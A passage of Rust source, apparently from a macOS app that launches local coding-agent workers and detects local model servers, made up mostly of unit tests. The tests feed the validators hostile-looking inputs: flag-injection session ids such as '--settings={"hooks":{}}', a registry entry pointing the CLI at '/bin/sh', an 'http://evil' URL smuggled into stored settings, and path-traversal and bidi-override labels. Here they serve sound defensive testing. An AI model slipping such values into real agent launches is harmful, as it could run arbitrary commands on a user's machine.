    pub(crate) async fn set_model(&self, choice: ModelChoice) -> Result<(), String> {
        self.ask(|reply| super::Cmd::Workers(Cmd::Set { choice, reply })).await?
    }

    /// Tests elsewhere in local_agent: the person's yes to a worker, as the
    /// tray gives it (tests/app_commands.rs keeps the real call to the tray).
    #[cfg(test)]
    pub(super) async fn allow_worker_as_tray(&self, worker: &str) -> Result<(), String> {
        self.allow_worker(worker.to_string(), true).await
    }

    /// The tray's Coding Agents menu, by id (native only: no command calls it).
    pub(crate) async fn allow_worker(&self, worker: String, allowed: bool) -> Result<(), String> {
        self.ask(|reply| super::Cmd::Workers(Cmd::Allow { worker, allowed, reply }))
            .await?
    }

    /// `local_agent_status`'s `workers`: what a start may name right now.
    pub(super) async fn offered_workers(&self) -> Vec<WorkerOffer> {
        self.ask(|reply| super::Cmd::Workers(Cmd::Offered { reply }))
            .await
            .unwrap_or_default()
    }

    async fn precheck(&self, job_id: Option<String>) -> Result<Precheck, String> {
        self.ask(|reply| super::Cmd::Workers(Cmd::Precheck { job_id, reply })).await
    }

    /// Before a start: the model and worker it would run on, checked here,
    /// before a slot is taken, an idle job parked or a worktree made. `None`:
    /// the job already runs (the start is a no-op; nothing is looked at).
    /// The worker named, or the one the job keeps, is looked up in the
    /// bundle's registry on disk: an id it doesn't list is refused.
    pub(super) async fn check_start(&self, args: &Checked, launch: &LaunchConfig) -> Result<Option<RunSpec>, String> {
        let pre = self.precheck(args.job_id.clone()).await?;
        // The job's worker: the one it keeps, else the one this start names.
        let worker = pre.recorded.clone().or_else(|| args.worker.clone());
        let bundle = BundleWorkers::read(launch, worker.is_some());
        // Even for a job that runs (the start is then a no-op): a start may
        // not name another worker.
        if pre.exists {
            check_same_worker(pre.recorded.as_deref(), args.worker.as_deref(), |r| bundle.label(r))?;
        }
        if pre.live {
            return Ok(None);
        }
        if worker.is_some() {
            let asked = args.resume.as_ref().map(|r| r.eve_session_id.as_str());
            check_worker_resume(asked, pre.session.as_deref())?;
        }
        self.plan_run(pre, worker.as_deref(), bundle, args.local_model, launch)
            .await
            .map(Some)
    }

    /// Hand the checked run to the actor for `job_id`'s launch.
    pub(super) fn stash_run(&self, job_id: &str, run: Option<RunSpec>) {
        if let Some(run) = run {
            let _ = self.cmds.send(super::Cmd::Workers(Cmd::Checked {
                job_id: job_id.to_string(),
                run,
            }));
        }
    }

    /// Before a resume: the same checks, on the job's own worker, which it
    /// answers (from the registry) for the resume's confirm.
    pub(super) async fn check_resume(
        &self,
        job_id: &str,
        local_model: Option<bool>,
        launch: &LaunchConfig,
    ) -> Result<Option<Worker>, String> {
        let pre = self.precheck(Some(job_id.to_string())).await?;
        if pre.live {
            // The resume itself says it's already running.
            return Ok(None);
        }
        let worker = pre.recorded.clone();
        let bundle = BundleWorkers::read(launch, worker.is_some());
        if worker.is_some() {
            check_worker_resume(None, pre.session.as_deref())?;
        }
        let run = self.plan_run(pre, worker.as_deref(), bundle, local_model, launch).await?;
        let worker = run.worker.as_ref().map(|w| w.worker.clone());
        self.stash_run(job_id, Some(run));
        Ok(worker)
    }

    async fn plan_run(
        &self,
        pre: Precheck,
        worker: Option<&str>,
        bundle: BundleWorkers,
        local_model: Option<bool>,
        launch: &LaunchConfig,
    ) -> Result<RunSpec, String> {
        let model = pre.choice?;
        check_mode(local_model, &model)?;
        let Some(id) = worker else {
            if let ModelChoice::Local { server, model: id } = &model {
                if !bundle.caps.local_model {
                    return Err(NO_LOCAL_SUPPORT.into());
                }
                let found = (pre.detect)().await;
                let verdict = served(&found, *server, id);
                let _ = self.cmds.send(super::Cmd::Workers(Cmd::Servers(found)));
                if let Err(why) = verdict {
                    crate::log_to_file(&format!("[local-agent] a start was refused: {why}"));
                    return Err(LOCAL_DOWN.into());
                }
            }
            return Ok(RunSpec { model, worker: None });
        };
        // Only an agent the bundle on disk lists: never one the page made up.
        let worker = bundle.registry.as_ref().ok_or(NO_WORKERS)?.resolve(id)?.clone();
        let name = &worker.label;
        if !model.is_relay() {
            return Err(format!(
                "this Mac uses a local model: the model runs here, and Native Intelligence tools still go through Native Intelligence. To use \
                 {name}, pick Native Intelligence in {WHERE}"
            ));
        }
        if !pre.allowed.iter().any(|a| a == id) {
            return Err(format!("{name} isn't allowed on this Mac; the person can allow it in {WORKERS_WHERE}"));
        }
        let Some(bin) = find_cli(&launch.tool_path, &worker.cli) else {
            return Err(format!(
                "{name} isn't installed on this Mac: there's no `{}` on your login shell's PATH. Native Intelligence doesn't \
                 install it; install it yourself, then start the job again",
                worker.cli
            ));
        };
        let bin = bin
            .to_str()
            .ok_or_else(|| format!("the path of `{}` is not valid UTF-8", worker.cli))?
            .to_string();
        let acp_dir = bundle
            .files
            .acp_dir
            .to_str()
            .ok_or("the local agent bundle's path is not valid UTF-8")?
            .to_string();
        Ok(RunSpec {
            model,
            worker: Some(WorkerRun {
                worker,
                adapter: bundle.files.adapter,
                acp_dir,
                bin,
                fence_dir: String::new(),
                closed_ports: Vec::new(),
                tools_file: None,
            }),
        })
    }
}

/// A worker's adapter, CLI and agents' adapters for `launch`, without the
/// launch's checks (the yes, the model): for `--return-logins` on a job that
/// isn't running ([`super::fence`]). `fence_dir` is left for the caller.
pub(super) fn login_run_for(launch: &LaunchConfig, id: &str) -> Result<WorkerRun, String> {
    let bundle = BundleWorkers::read(launch, true);
    let worker = bundle.registry.as_ref().ok_or(NO_WORKERS)?.resolve(id)?.clone();
    let bin = find_cli(&launch.tool_path, &worker.cli)
        .ok_or_else(|| format!("there's no `{}` on the login shell's PATH", worker.cli))?
        .to_str()
        .ok_or("the CLI's path is not valid UTF-8")?
        .to_string();
    let acp_dir = bundle
        .files
        .acp_dir
        .to_str()
        .ok_or("the local agent bundle's path is not valid UTF-8")?
        .to_string();
    Ok(WorkerRun {
        worker,
        adapter: bundle.files.adapter,
        acp_dir,
        bin,
        fence_dir: String::new(),
        closed_ports: Vec::new(),
        tools_file: None,
    })
}

/// What a launch's bundle offers workers: its capabilities, where their
/// files are, and its registry when it runs workers and has all of them.
struct BundleWorkers {
    caps: Caps,
    files: WorkerFiles,
    registry: Option<Registry>,
}

impl BundleWorkers {
    /// `needed`: a worker is involved (else the registry isn't read).
    fn read(launch: &LaunchConfig, needed: bool) -> BundleWorkers {
        let caps = bundle_caps(Path::new(&launch.agent_dir));
        let files = WorkerFiles::for_launch(launch);
        let registry = (needed && caps.workers).then(|| files.registry_if_complete()).flatten();
        BundleWorkers { caps, files, registry }
    }

    fn label(&self, id: &str) -> Option<String> {
        self.registry.as_ref()?.get(id).map(|w| w.label.clone())
    }
}

/// The registry of the bundle `resolved` names, when it has everything a
/// worker needs (its capability aside: the tray still names a worker the
/// person allowed by it).
fn resolved_registry(resolved: &super::config::Resolved) -> Option<Registry> {
    let dir = resolved.agent_dir.as_deref()?;
    WorkerFiles::for_agent(dir, !resolved.packaged).registry_if_complete()
}

/// Look every [`WATCH_EVERY`] while a folder is shared and local agents are
/// on: the bundle's capabilities, the servers, the registry and the CLIs, so
/// the tray's submenus come and go with them. Before that, the registry
/// alone, once, so the tray names the workers the person allowed. Spawned
/// once by [`LocalAgentService::spawn`]; ends with the actor.
pub(super) async fn watch(cmds: mpsc::UnboundedSender<super::Cmd>, resolver: Arc<Resolver>) {
    let first = resolved_registry(&resolver.resolve(false).await);
    if cmds.send(super::Cmd::Workers(Cmd::Registry(first))).is_err() {
        return;
    }
    let look = move || {
        let resolver = resolver.clone();
        async move {
            let resolved = resolver.resolve(false).await;
            let caps = resolved.agent_dir.as_deref().map_or_else(Caps::default, bundle_caps);
            let registry = resolved_registry(&resolved);
            let servers = if caps.local_model { Some(detect_all().await) } else { None };
            let clis = match registry.as_ref().filter(|_| caps.workers) {
                Some(registry) => {
                    let path = resolver.shell_path().await;
                    registry
                        .workers()
                        .iter()
                        .filter(|w| find_cli(&path, &w.cli).is_some())
                        .map(|w| w.id.clone())
                        .collect()
                }
                None => Vec::new(),
            };
            Found {
                caps,
                servers,
                registry,
                clis,
            }
        }
    };
    watch_with(cmds, WATCH_EVERY, look).await;
}

async fn watch_with<F, Fut>(cmds: mpsc::UnboundedSender<super::Cmd>, every: Duration, look: F)
where
    F: Fn() -> Fut,
    Fut: Future<Output = Found>,
{
    let mut tick = tokio::time::interval(every);
    tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    loop {
        tick.tick().await;
        let (tx, rx) = oneshot::channel();
        if cmds.send(super::Cmd::Workers(Cmd::Watching { reply: tx })).is_err() {
            return;
        }
        match rx.await {
            Ok(true) => {}
            Ok(false) => continue,
            Err(_) => return,
        }
        let found = look().await;
        if cmds.send(super::Cmd::Workers(Cmd::Found(found))).is_err() {
            return;
        }
    }
}

// The local agent runs on macOS only so far (its jobs, shells and
// sandbox are POSIX): its tests are too.
#[cfg(all(test, unix))]
mod tests {
    use std::collections::{BTreeMap, VecDeque};
    use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
    use std::sync::Mutex;

    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    use super::super::config::{LaunchEnv, Resolver};
    use super::super::runtime::{Runtime, RuntimeSpec};
    use super::super::state::{GrantMode, StateFile};
    use super::super::{EventPayload, Host, Paths, StartArgs, StartResult, Timing, TrayView, MAX_RUNNING, PARKED};
    use super::*;

    fn local(server: LocalServer, model: &str) -> ModelChoice {
        ModelChoice::Local {
            server,
            model: model.into(),
        }
    }

    fn found(server: LocalServer, running: bool, models: &[&str]) -> Detected {
        Detected {
            server,
            running,
            models: models.iter().map(|m| m.to_string()).collect(),
            refused: None,
        }
    }

    fn choice(id: &str, label: &str, checked: bool) -> MenuLine {
        MenuLine::Choice {
            id: id.into(),
            label: label.into(),
            checked,
        }
    }

    const BOTH: Caps = Caps {
        local_model: true,
        workers: true,
    };

    /// The shape of the bundle's `workers/registry.json` (two of its entries
    /// as the adapter's registry has them).
    const REGISTRY: &str = r#"{
      "codex": {
        "label": "Codex",
        "cli": "codex",
        "command": ["$NODE", "$ACP_DIR/node_modules/@agentclientprotocol/codex-acp/dist/index.js"],
        "env": { "CODEX_PATH": "$CLI" },
        "sessionMode": "agent-full-access",
        "login": { "sharedState": [".codex"] },
        "signInHint": "Codex isn't signed in on this Mac.",
        "packages": { "@agentclientprotocol/codex-acp": "2.6.0" }
      },
      "claude-code": {
        "label": "Claude Code",
        "cli": "claude",
        "command": ["$NODE", "$ACP_DIR/node_modules/@agentclientprotocol/claude-agent-acp/dist/index.js"],
        "env": { "CLAUDE_CODE_EXECUTABLE": "$CLI" },
        "login": { "keychain": true },
        "signInHint": "Claude Code isn't signed in on this Mac.",
        "packages": { "@agentclientprotocol/claude-agent-acp": "0.107.0" }
      }
    }"#;

    fn registry() -> Registry {
        Registry::parse(REGISTRY.as_bytes()).unwrap()
    }

    fn worker(id: &str) -> Worker {
        registry().get(id).unwrap().clone()
    }

    #[test]
    fn the_registry_is_the_bundles_agents_by_id() {
        let r = registry();
        let ids: Vec<&str> = r.workers().iter().map(|w| w.id.as_str()).collect();
        assert_eq!(ids, ["claude-code", "codex"], "sorted by id");
        assert_eq!(
            worker("claude-code"),
            Worker {
                id: "claude-code".into(),
                label: "Claude Code".into(),
                cli: "claude".into(),
            }
        );
        assert_eq!(r.resolve("codex").map(|w| w.cli.as_str()), Ok("codex"));
        // An id the page sends that the registry doesn't list is refused.
        for unknown in ["cursor", "claude", "Codex", ""] {
            assert_eq!(
                r.resolve(unknown),
                Err("worker must be one of \"claude-code\", \"codex\"".into()),
                "{unknown}"
            );
        }
        // Only `label` and `cli` are Rust's: the rest is the adapter's.
        let lean = Registry::parse(br#"{"gemini":{"label":"Gemini CLI","cli":"gemini"}}"#).unwrap();
        assert_eq!(lean.get("gemini").unwrap().label, "Gemini CLI");
    }

    #[test]
    fn a_malformed_registry_is_refused_whole() {
        let entry = |id: &str, label: &str, cli: &str| format!(r#"{{"{id}":{{"label":"{label}","cli":"{cli}"}}}}"#);
        let ok = entry("claude-code", "Claude Code", "claude");
        assert!(Registry::parse(ok.as_bytes()).is_ok());
        let long = "a".repeat(MAX_LABEL + 1);
        let many: String = format!(
            "{{{}}}",
            (0..=MAX_WORKERS)
                .map(|i| format!(r#""w{i}":{{"label":"W","cli":"w"}}"#))
                .collect::<Vec<_>>()
                .join(",")
        );
        for bad in [
            "".to_string(),
            "{ not json".into(),
            "[]".into(),
            "\"claude-code\"".into(),
            "{}".into(),
            many,
            r#"{"claude-code":"Claude Code"}"#.into(),
            r#"{"claude-code":{"cli":"claude"}}"#.into(),
            r#"{"claude-code":{"label":"Claude Code"}}"#.into(),
            r#"{"claude-code":{"label":7,"cli":"claude"}}"#.into(),
            // Ids as the adapter's registry has them, and nothing else.
            entry("Claude", "Claude Code", "claude"),
            entry("-x", "X", "x"),
            entry("../x", "X", "x"),
            entry(&"a".repeat(33), "X", "x"),
            // A CLI is a name on PATH: never a path or a flag.
            entry("x", "X", "/usr/local/bin/claude"),
            entry("x", "X", "../claude"),
            entry("x", "X", "-claude"),
            entry("x", "X", ".claude"),
            entry("x", "X", "cl aude"),
            // A label is shown in the tray and in a native confirm: plain words.
            entry("x", "", "x"),
            entry("x", &long, "x"),
            entry("x", " Claude", "x"),
            entry("x", "Claude  Code", "x"),
            entry("x", "Claude\\nCode", "x"),
            entry("x", "Claude\u{202e}Code", "x"),
            entry("x", "Claude: Code?", "x"),
        ] {
            assert!(Registry::parse(bad.as_bytes()).is_err(), "{bad}");
        }
        // A key twice, at the top or in an entry: never "the last one wins".
        for dup in [
            r#"{"codex":{"label":"Codex","cli":"codex"},"codex":{"label":"Codex","cli":"/bin/sh"}}"#,
            r#"{"codex":{"label":"Codex","cli":"codex","cli":"sh"}}"#,
            r#"{"codex":{"label":"Codex","cli":"codex","login":{"keychain":true,"keychain":false}}}"#,
        ] {
            let err = Registry::parse(dup.as_bytes()).unwrap_err();
            assert!(err.contains("appears twice"), "{dup}: {err}");
        }
        // One bad entry takes every worker with it.
        let mixed = r#"{"claude-code":{"label":"Claude Code","cli":"claude"},"x":{"label":"X","cli":"/bin/x"}}"#;
        assert!(Registry::parse(mixed.as_bytes()).is_err());
    }

    #[test]
    fn a_start_names_a_worker_by_an_id_of_the_registrys_shape() {
        for ok in ["claude-code", "codex", "a", "gemini-2", &"a".repeat(32)] {
            assert!(is_worker_id(ok) && check_worker_id(ok).is_ok(), "{ok}");
        }
        for bad in ["", "Codex", "2x", "-x", "claude_code", "claude code", "../codex", &"a".repeat(33)] {
            assert_eq!(check_worker_id(bad), Err("worker is not a coding agent's id".into()), "{bad}");
        }
    }

    #[test]
    fn servers_have_one_name_each() {
        for s in LocalServer::ALL {
            assert_eq!(LocalServer::parse(s.as_str()), Some(s));
            assert_eq!(serde_json::to_value(s).unwrap(), s.as_str());
            assert!(s.base_url().starts_with("http://127.0.0.1:"), "loopback only");
            assert!(s.base_url().ends_with("/v1"));
        }
    }

    #[test]
    fn the_choice_is_stored_as_raw_json_and_the_relay_as_nothing() {
        assert_eq!(ModelChoice::Relay.to_stored(), None);
        assert_eq!(ModelChoice::from_stored(None), Ok(ModelChoice::Relay));
        let c = local(LocalServer::Ollama, "llama3.1:8b");
        let v = c.to_stored().unwrap();
        assert_eq!(v, serde_json::json!({ "kind": "local", "server": "ollama", "model": "llama3.1:8b" }));
        assert_eq!(ModelChoice::from_stored(Some(&v)), Ok(c));
        assert_eq!(
            ModelChoice::from_stored(Some(&serde_json::json!({ "kind": "relay" }))),
            Ok(ModelChoice::Relay)
        );
        for bad in [
            serde_json::json!({ "kind": "local", "server": "vllm", "model": "m" }),
            serde_json::json!({ "kind": "local", "server": "ollama" }),
            serde_json::json!({ "kind": "local", "server": "ollama", "model": "has space" }),
            serde_json::json!({ "kind": "local", "server": "ollama", "model": "m", "url": "http://evil" }),
            serde_json::json!({ "kind": "cloud" }),
            serde_json::json!("ollama"),
        ] {
            assert_eq!(ModelChoice::from_stored(Some(&bad)), Err(UNREADABLE.into()), "{bad}");
        }
    }

    #[test]
    fn model_json_round_trips_and_keeps_what_it_cant_read() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("nested/model.json");
        assert_eq!(Stored::load(&path), Stored::default(), "missing: nothing chosen");
        let newer = Stored {
            model: Some(serde_json::json!({ "kind": "local", "server": "vllm", "model": "m" })),
            allowed_workers: vec!["codex".into(), "cursor".into()],
            worker_folders: vec![serde_json::json!({ "worker": "codex", "folder": "/Users/x/site" }), serde_json::json!("newer")],
        };
        newer.save(&path).unwrap();
        assert_eq!(Stored::load(&path), newer, "a newer Native Intelligence's values survive");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
        }
        assert!(newer.allowed("codex") && !newer.allowed("claude-code"));
        std::fs::write(&path, "{ not json").unwrap();
        let broken = Stored::load(&path);
        assert!(ModelChoice::from_stored(broken.model.as_ref()).is_err(), "unreadable: never the relay");
        assert!(broken.allowed_workers.is_empty(), "and no worker allowed");
    }

    #[test]
    fn menu_ids_round_trip_model_ids_with_colons_and_slashes() {
        for c in [
            ModelChoice::Relay,
            local(LocalServer::Ollama, "llama3.1:8b"),
            local(LocalServer::Ollama, "hf.co/bartowski/Llama-3.2-1B-Instruct-GGUF:Q4_K_M"),
            local(LocalServer::LmStudio, "lmstudio-community/qwen2.5-7b-instruct"),
        ] {
            assert_eq!(ModelChoice::from_menu_id(&c.menu_id()), Some(c.clone()), "{}", c.menu_id());
        }
        for bad in ["", "ollama", "ollama:", "vllm:m", "ollama:has space", "relay:x"] {
            assert_eq!(ModelChoice::from_menu_id(bad), None, "{bad}");
        }
    }

    #[test]
    fn model_lists_parse_as_the_openai_shape_minus_embeddings_and_junk() {
        let body = serde_json::json!({
            "object": "list",
            "data": [
                { "id": "llama3.1:8b", "object": "model", "owned_by": "library" },
                { "id": "nomic-embed-text:latest" },
                { "id": "text-embedding-nomic-embed-text-v1.5" },
                { "id": "qwen2.5-coder:14b" },
                { "id": "llama3.1:8b" },
                { "id": "has space" },
                { "id": 7 },
                { "object": "model" },
                { "id": "x".repeat(MAX_MODEL_ID + 1) },
            ]
        });
        assert_eq!(
            parse_models(body.to_string().as_bytes()),
            Some(vec!["llama3.1:8b".to_string(), "qwen2.5-coder:14b".to_string()])
        );
        assert_eq!(parse_models(br#"{"data":[]}"#), Some(vec![]));
        let many: Vec<Value> = (0..150).map(|i| serde_json::json!({ "id": format!("m{i}") })).collect();
        assert_eq!(
            parse_models(serde_json::json!({ "data": many }).to_string().as_bytes()).map(|m| m.len()),
            Some(MAX_MODELS)
        );
        for not_a_list in [&b"<html>"[..], br#"{"models":[]}"#, br#"{"data":{}}"#, b""] {
            assert_eq!(parse_models(not_a_list), None);
        }
    }

    #[test]
    fn bundle_capabilities_are_read_from_bundle_json_and_default_to_none() {
        let dir = tempfile::tempdir().unwrap();
        let caps = |json: &str| {
            std::fs::write(dir.path().join("BUNDLE.json"), json).unwrap();
            bundle_caps(dir.path())
        };
        assert_eq!(bundle_caps(&dir.path().join("missing")), Caps::default());
        assert_eq!(caps(r#"{"webCommit":"eecf7a3d4","files":{}}"#), Caps::default(), "today's bundle");
        assert_eq!(caps(r#"{"capabilities":["local-model","workers","later"]}"#), BOTH);
        assert_eq!(
            caps(r#"{"capabilities":["workers"]}"#),
            Caps {
                local_model: false,
                workers: true
            }
        );
        assert_eq!(caps(r#"{"capabilities":"local-model"}"#), Caps::default());
        assert_eq!(caps("not json"), Caps::default());
    }

    /// One HTTP answer per connection, `status` and `body` as given.
    async fn fake_server(status: &'static str, body: String) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                let body = body.clone();
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let _ = sock.read(&mut buf).await;
                    let resp = format!(
                        "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nLocation: http://127.0.0.1:9/\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                });
            }
        });
        format!("http://{addr}/v1")
    }

    #[tokio::test]
    async fn detection_reads_a_running_servers_models() {
        let base = fake_server("200 OK", r#"{"object":"list","data":[{"id":"llama3.1:8b"}]}"#.into()).await;
        let got = detect_at(detect_client().unwrap(), LocalServer::Ollama, &base).await;
        assert_eq!(got, found(LocalServer::Ollama, true, &["llama3.1:8b"]));
    }

    /// Ollama, path by path: its model list, and `/api/show` per model.
    async fn fake_ollama(models: &'static [&'static str]) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                tokio::spawn(async move {
                    let mut req = Vec::new();
                    let mut buf = vec![0u8; 4096];
                    // Headers, then the body Content-Length says.
                    loop {
                        let Ok(n) = sock.read(&mut buf).await else { return };
                        if n == 0 {
                            return;
                        }
                        req.extend_from_slice(&buf[..n]);
                        let text = String::from_utf8_lossy(&req).to_string();
                        if let Some(end) = text.find("\r\n\r\n") {
                            let len = text
                                .lines()
                                .find_map(|l| l.to_ascii_lowercase().strip_prefix("content-length:").map(|v| v.trim().to_string()))
                                .and_then(|v| v.parse::<usize>().ok())
                                .unwrap_or(0);
                            if req.len() >= end + 4 + len {
                                break;
                            }
                        }
                    }
                    let text = String::from_utf8_lossy(&req).to_string();
                    let (status, body) = if text.starts_with("GET /v1/models") {
                        let data: Vec<Value> = models.iter().map(|m| serde_json::json!({ "id": m })).collect();
                        ("200 OK", serde_json::json!({ "object": "list", "data": data }).to_string())
                    } else if text.contains("qwen3:remote") {
                        ("200 OK", r#"{"remote_host":"https://ollama.com:443","remote_model":"qwen3"}"#.into())
                    } else if text.contains("broken:7b") {
                        ("500 Internal Server Error", "{}".into())
                    } else {
                        ("200 OK", r#"{"modelfile":"FROM llama","details":{"family":"llama"}}"#.into())
                    };
                    let resp = format!(
                        "HTTP/1.1 {status}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                });
            }
        });
        format!("http://{addr}/v1")
    }

    #[tokio::test]
    async fn ollamas_cloud_models_are_never_offered() {
        let base = fake_ollama(&["llama3.1:8b", "gpt-oss:120b-cloud", "qwen3:remote", "broken:7b", "mistral:7b"]).await;
        let client = detect_client().unwrap();
        let got = detect_at(client, LocalServer::Ollama, &base).await;
        assert_eq!(got, found(LocalServer::Ollama, true, &["llama3.1:8b", "mistral:7b"]));
        // Remembered: the same answer again.
        assert_eq!(detect_at(client, LocalServer::Ollama, &base).await, got);
        // LM Studio has no cloud models: its list is as it says.
        let lms = detect_at(client, LocalServer::LmStudio, &base).await;
        assert_eq!(lms.models.len(), 5);
    }

    #[tokio::test]
    async fn anything_but_a_model_list_is_not_running() {
        let client = detect_client().unwrap();
        for base in [
            fake_server("500 Internal Server Error", "{}".into()).await,
            fake_server("302 Found", r#"{"data":[{"id":"m"}]}"#.into()).await,
            fake_server("200 OK", "<html>hello</html>".into()).await,
            fake_server("200 OK", format!(r#"{{"data":[{{"id":"{}"}}]}}"#, "m".repeat(MAX_LIST_BYTES))).await,
            // Nothing listens on the discard port.
            "http://127.0.0.1:9/v1".to_string(),
        ] {
            let got = detect_at(client, LocalServer::LmStudio, &base).await;
            assert_eq!(got, Detected::down(LocalServer::LmStudio), "{base}");
        }
    }

    #[test]
    fn a_start_needs_the_model_served_right_now() {
        let found = vec![
            found(LocalServer::Ollama, true, &["llama3.1:8b"]),
            found(LocalServer::LmStudio, false, &[]),
        ];
        assert_eq!(served(&found, LocalServer::Ollama, "llama3.1:8b"), Ok(()));
        assert_eq!(
            served(&found, LocalServer::Ollama, "qwen2.5:7b"),
            Err("Ollama no longer lists qwen2.5:7b".into())
        );
        assert_eq!(
            served(&found, LocalServer::LmStudio, "m"),
            Err("LM Studio isn't running (the model is m)".into())
        );
        assert!(served(&[], LocalServer::Ollama, "m").is_err());
        // What the page is told names neither.
        for leak in ["Ollama", "LM Studio", "llama", "qwen"] {
            assert!(!LOCAL_DOWN.contains(leak) && !NO_LOCAL_SUPPORT.contains(leak), "{leak}");
        }
    }

    fn executable(p: &Path) {
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, "#!/bin/sh\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
    }

    #[test]
    fn the_cli_is_found_on_the_login_shell_path_only() {
        let dir = tempfile::tempdir().unwrap();
        let (a, b) = (dir.path().join("a"), dir.path().join("b"));
        std::fs::create_dir_all(&a).unwrap();
        // Not executable: skipped.
        std::fs::write(a.join("claude"), "").unwrap();
        executable(&b.join("claude"));
        let path = format!("relative:{}:{}", a.display(), b.display());
        assert_eq!(find_cli(&path, "claude"), Some(b.join("claude")));
        assert_eq!(find_cli(&path, "codex"), None);
        assert_eq!(find_cli("bin:.", "claude"), None);
    }

    #[test]
    fn a_job_keeps_the_model_mode_its_session_was_claimed_with() {
        let relay = ModelChoice::Relay;
        let local = local(LocalServer::Ollama, "llama3.1:8b");
        assert_eq!(check_mode(None, &relay), Ok(()), "an older web: this Mac's mode");
        assert_eq!(check_mode(None, &local), Ok(()));
        assert_eq!(check_mode(Some(false), &relay), Ok(()));
        assert_eq!(check_mode(Some(true), &local), Ok(()));
        assert_eq!(check_mode(Some(false), &local), Err(MODE_NOW_LOCAL.into()));
        assert_eq!(check_mode(Some(true), &relay), Err(MODE_NOW_RELAY.into()));
        for leak in ["Ollama", "llama"] {
            assert!(!MODE_NOW_LOCAL.contains(leak) && !MODE_NOW_RELAY.contains(leak));
        }
    }

    const UUID: &str = "0199a213-81c0-7800-8aa1-bbab2a035a53";

    #[test]
    fn a_worker_session_is_the_adapters_shape_and_never_a_flag() {
        let longest = "s".repeat(MAX_WORKER_SESSION);
        for ok in [
            UUID,
            "0199A213-81C0-7800-8AA1-BBAB2A035A53",
            "urn:uuid:0199a213-81c0-7800-8aa1-bbab2a035a53",
            "0199a21381c078008aa1bbab2a035a53",
            "ses-0199a213-81c0-7800-8aa1-bbab2a035a53",
            "thread_01.abc:2",
            "7",
            longest.as_str(),
        ] {
            assert!(is_worker_session(ok), "{ok}");
        }
        let too_long = "s".repeat(MAX_WORKER_SESSION + 1);
        for bad in [
            "",
            "--settings={\"hooks\":{}}",
            "--mcp-config=/tmp/x.json",
            "-x",
            "--last",
            ".hidden",
            ":x",
            "_x",
            "{0199a213-81c0-7800-8aa1-bbab2a035a53}",
            "a b",
            "a/b",
            "a\nb",
            "caf\u{e9}",
            too_long.as_str(),
        ] {
            assert!(!is_worker_session(bad), "{bad}");
        }
    }

    #[test]
    fn a_worker_resumes_only_the_session_this_mac_recorded() {
        assert_eq!(check_worker_resume(None, None), Ok(()), "a new job");
        assert_eq!(check_worker_resume(None, Some(UUID)), Ok(()));
        assert_eq!(check_worker_resume(Some(UUID), Some(UUID)), Ok(()), "the server names this Mac's own");
        let other = "11111111-2222-4333-8444-555555555555";
        let upper = UUID.to_uppercase();
        // Of the right shape or not, an id this Mac didn't record is refused.
        for asked in ["--settings={\"hooks\":{}}", "-x", "--last", upper.as_str(), "not-a-uuid", other] {
            assert_eq!(check_worker_resume(Some(asked), Some(UUID)), Err(FOREIGN_SESSION.into()), "{asked}");
            assert_eq!(check_worker_resume(Some(asked), None), Err(FOREIGN_SESSION.into()), "{asked}");
        }
        assert_eq!(check_worker_resume(Some(UUID), None), Err(FOREIGN_SESSION.into()), "never recorded here");
        assert_eq!(check_worker_resume(None, Some("--last")), Err(BAD_SESSION.into()));
    }

    #[test]
    fn a_start_may_not_switch_a_jobs_worker() {
        let r = registry();
        let label = |id: &str| r.get(id).map(|w| w.label.clone());
        assert_eq!(check_same_worker(None, None, label), Ok(()));
        assert_eq!(check_same_worker(Some("codex"), None, label), Ok(()), "absent: the job's own");
        assert_eq!(check_same_worker(Some("codex"), Some("codex"), label), Ok(()));
        assert_eq!(
            check_same_worker(Some("codex"), Some("claude-code"), label),
            Err("this job runs on Codex".into())
        );
        assert_eq!(
            check_same_worker(Some("cursor"), Some("codex"), label),
            Err("this job runs on another coding agent".into()),
            "a worker this registry doesn't list"
        );
        assert_eq!(
            check_same_worker(None, Some("codex"), label),
            Err("this job runs on Native Intelligence's agent".into())
        );
        // The actor's check that the handler's lookup is still the job's.
        assert_eq!(same_worker(None, None), Ok(None));
        assert_eq!(same_worker(Some("codex"), Some(worker("codex"))), Ok(Some(worker("codex"))));
        for (id, found) in [
            (Some("codex"), None),
            (None, Some(worker("codex"))),
            (Some("claude-code"), Some(worker("codex"))),
        ] {
            assert_eq!(same_worker(id, found), Err(CHANGED.into()));
        }
    }

    fn launch_config(base: &Path) -> LaunchConfig {
        LaunchConfig {
            node: "/bin/sh".into(),
            launcher: base.join("launcher.sh"),
            agent_dir: base.join("agent").to_str().unwrap().into(),
            env_file: None,
            tool_path: format!("{}:/usr/bin:/bin", base.join("bin").display()),
            home: base.join("home").to_str().unwrap().into(),
            model_base_url: super::super::config::model_base_url("https://nativeintelligence.test"),
            git: "/usr/bin/git".into(),
            git_env: Vec::new(),
            gh: None,
            api_origin: "https://nativeintelligence.test".into(),
        }
    }

    /// The launcher's env keys for `run`, with or without a token.
    fn env_keys(launch: &LaunchConfig, run: &RunSpec, token: bool) -> Vec<String> {
        let env = super::super::config::launcher_env(
            launch,
            LaunchEnv {
                job_id: "job-1",
                folder: "/Users/x/code/site",
                mode: "read",
